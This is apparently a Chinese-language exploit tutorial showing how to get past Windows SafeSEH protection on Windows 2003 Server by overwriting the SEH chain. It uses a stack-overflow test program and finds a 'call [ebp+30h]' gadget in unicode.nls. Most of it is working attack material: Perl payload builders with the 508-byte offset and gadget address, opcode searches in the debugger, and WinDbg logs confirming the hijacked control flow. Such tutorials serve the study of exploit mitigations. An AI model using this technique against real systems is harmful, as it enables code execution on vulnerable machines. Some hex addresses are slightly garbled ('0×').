### 优化后的文本

#### 汇编代码示例
```assembly
004010cb ff5530 call dword ptr [ebp+30h]
004010ce ff6530 jmp dword ptr [ebp+30h]
```

#### 目标
我们的目标是在加载模块之外的地址空间中找到包含上述指令的地址。如果能找到，我们就能成功利用这个漏洞。

#### 环境
为了演示这一过程，我们将使用之前解释/GS机制时使用的代码，并在Windows 2003 Server R2 SP2英文正式版上编写一个exploit。

#### 示例代码
```c
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

void GetInput(char* str, char* out) {
    char buffer[500];
    try {
        strcpy(buffer, str);
        strcpy(out, buffer);
        printf("Input received: %s\n", buffer);
    } catch (char* strErr) {
        printf("No valid input received!\n");
        printf("Exception: %s\n", strErr);
    }
}

int main(int argc, char* argv[]) {
    char buf2[128];
    GetInput(argv[1], buf2);
    return 0;
}
```

#### 编译设置
- 不启用 /GS 和 /RTC
- 启用 safeseh 机制（设置“linker”命令行参数 `/safeseh:yes`）
- 运行环境：Windows 2003 Server R2 SP2 英文正式版
- DEP模式设置为 OptIn（仅对系统核心进程进行保护）

#### 调试工具
使用 OllyDbg 加载执行文件，观察到所有模块和执行映像都启用了 safeseh 保护。

#### 覆盖异常处理器
我们需要在 508 字节后覆盖异常处理器。以下是一个示例：
```perl
my $size = 508;
$junk = "A" x $size;
$junk .= "BBBB";  # 覆盖 next_seh
$junk .= "DDDD";  # 覆盖 异常处理器
system("\"C:\\Program Files\\Debugging Tools for Windows (x86)\\windbg\" seh \"$junk\"\r\n");
```

#### 模块加载
```plaintext
ModLoad: 00400000 00406000 seh.exe
ModLoad: 7c800000 7c8c2000 ntdll.dll
ModLoad: 77e40000 77f42000 C:\WINDOWS\system32\kernel32.dll
ModLoad: 78520000 785c3000 C:\WINDOWS\WinSxS\x86_Microsoft.VC90.CRT_1...dll
```

#### 异常处理
```plaintext
(c5c.c64): Break instruction exception - code 80000003 (first chance)
eax=78600000 ebx=7ffdb000 ecx=00000005 edx=00000020 esi=7c8897f4 edi=00151f38
eip=7c81a3e1 esp=0012fb70 ebp=0012fcb4 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c81a3e1 cc int 3
0:000> g
(c5c.c64): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fd41 ebx=00000000 ecx=0012fd41 edx=00130000 esi=00000001 edi=004033a8
eip=004010cb esp=0012fcb4 ebp=0012feec iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
seh!GetInput+0xcb:
004010cb 8802 mov byte ptr [edx],al ds:0023:00130000=41
0:000> !exchain
0012fee0: 44444444
Invalid exception stack at 42424242
```

#### 寻找合适的地址
由于所有模块都被 safeseh 保护，我们需要在内存中搜索 `call/jmp dword ptr [reg+nn]` 指令。已知的操作码如下：
- `call dword ptr [ebp+0x30]`: `ff 55 30`
- `jmp dword ptr [ebp+0x30]`: `ff 65 30`

使用调试器搜索这些操作码：
```plaintext
0:000> s 0100000 l 77fffff ff 55 30
00270b0b ff 55 30 00 00 00 00 9e-ff 57 30 00 00 00 00 9e .U0......W0.....
```

或者使用 Immunity Debugger 的 `pvefindaddr` 插件：
```plaintext
!pvefindaddr jseh
```

#### 内存视图
使用调试器或 Microsoft vadump 工具查看内存区域。

#### 继续搜索
扩大搜索范围以找到更多类似指令：
```plaintext
0:000> s 0100000 l 77fffff ff 55
00267643 ff 55 ff 61 ff 54 ff 57-ff dc ff 58 ff cc ff f3 .U.a.T.W...X....
00270b0b ff 55 30 00 00 00 00 9e-ff 57 30 00 00 00 00 9e .U0......W0.....
...
```

#### 选择合适的地址
地址 `0×00270b0b` 属于 `unicode.nls`，不属于任何加载模块。对于控制台应用程序，它总是被映射为 `0×00260000`（在 Windows 2003 Server R2 英文正式版上）。

#### 解决 NULL 字节问题
我们在 `unicode.nls` 中找到的 `call dword ptr [ebp+30h]` 指令的地址以 NULL 字节开头。因此，我们不能将 shellcode 布置在异常处理器之后。可以尝试在 SEH 被覆盖之前布置 shellcode。

#### 覆盖 nextseh 和异常处理器
```perl
$junk = "A" x 508;
$junk .= "\xcc\xcc\xcc\xcc";
$junk .= pack('V', 0x00270b0b);
```

#### 调试结果
```plaintext
(a94.c34): Break instruction exception - code 80000003 (first chance)
eax=78600000 ebx=7ffdb000 ecx=00000005 edx=00000020 esi=7c8897f4 edi=00151f38
eip=7c81a3e1 esp=0012fb70 ebp=0012fcb4 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c81a3e1 cc int 3
0:000> g
(a94.c34): Access violation - code c0000005 (first chance)
...
```

#### 成功改写 SEH 链
新的 SEH 链表明我们已经成功改写了 `nseh` 和 `seh`。异常传递给程序后，程序会跳转到四个 `int 3` 指令继续执行。

#### 跟踪异常处理
当异常发生时，步入跟踪可以看到 ntdll 中的验证例程 `RtlIsValidHandler` 被调用，最后异常处理器被执行：
```plaintext
eax=00000000 ebx=00000000 ecx=00270b0b edx=7c828786 esi=00000000 edi=00000000
eip=7c828770 esp=0012f8f0 ebp=0012f90c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
ntdll!ExecuteHandler2+0x24:
7c828770 ffd1 call ecx {00270b0b}
0:000>
eax=00000000 ebx=00000000 ecx=00270b0b edx=7c828786 esi=00000000 edi=00000000
eip=00270b0b esp=0012f8ec ebp=0012f90c iopl=0 nv up ei pl zr na pe nc
```

通过以上步骤，我们成功地在加载模块之外的地址空间找到了包含所需指令的地址，并成功改写了 SEH 链。